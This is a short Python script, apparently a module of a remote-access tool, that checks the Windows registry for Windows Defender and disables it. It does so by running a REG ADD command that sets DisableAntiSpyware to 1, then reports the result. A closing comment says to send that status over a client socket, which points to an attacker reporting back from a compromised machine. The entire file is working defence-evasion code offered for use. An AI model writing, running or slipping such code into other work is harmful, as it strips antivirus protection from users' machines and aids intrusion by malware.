import winreg
import subprocess

def reg_exists(key_path):
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        winreg.CloseKey(key)
        return True
    except FileNotFoundError:
        return False
    except Exception as e:
        print(f"Error checking registry key: {e}")
        return False

def windefnd_scan():
    defender = reg_exists('SOFTWARE\\Microsoft\\Windows Defender')
    if not defender:
        defender = reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender')
    return defender

def windefnd_running():
    key = None
    if reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender'):
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Policies\\Microsoft\\Windows Defender')
    elif reg_exists('SOFTWARE\\Microsoft\\Windows Defender'):
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Windows Defender')
    if key:
        try:
            val = winreg.QueryValueEx(key, "DisableAntiSpyware")
            if val[0] == 1:
                return False
            else:
                return True
        except Exception as e:
            print(f"Error checking Windows Defender status: {e}")
            return False
    return False

def run_command(command):
    try:
        subprocess.run(command, shell=True, check=True)
        return True
    except subprocess.CalledProcessError as e:
        print(f"Error running command: {e}")
        return False

def disable_windef():
    if reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender'):
        return run_command('REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
    elif reg_exists('SOFTWARE\\Microsoft\\Windows Defender'):
        return run_command('REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
    else:
        return False

if windefnd_scan():
    if windefnd_running():
        if disable_windef():
            if windefnd_running():
                resp = "[!] Failed to disable Windows Defender\n"
            else:
                resp = "[+] Windows Defender is now disabled\n"
        else:
            resp = "[-] Error disabling Windows Defender\n"
    else:
        resp = "[+] Windows Defender is already disabled\n"
else:
    resp = "[*] Windows Defender not detected on the system\n"

print(resp)  # Replace this with send(client_socket,resp) for actual socket sending
